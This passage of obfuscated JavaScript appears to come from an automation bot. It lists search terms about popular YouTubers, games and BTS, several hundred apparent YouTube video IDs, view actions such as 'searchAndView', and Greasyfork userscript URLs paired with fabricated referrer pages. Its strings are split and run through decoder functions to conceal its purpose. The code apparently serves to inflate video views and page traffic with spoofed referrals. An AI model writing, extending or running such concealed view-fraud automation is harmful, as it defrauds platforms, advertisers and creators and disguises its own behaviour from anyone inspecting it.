'\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + U(0x0) + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1939 + -0x313 * 0x2 + 0x1f69)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x99b * 0x2 + 0x60 * -0x1b + 0x1d60)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x228 + 0x13a7 + -0x117c);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    V(0x1b, 'iOHj') + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    V(0x8, 'H%[C') + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    U(0x1a) + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + V(0x2, 'CxVy')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + W(0x10) + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + U(0x12) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + W(0x1f)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0xf) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
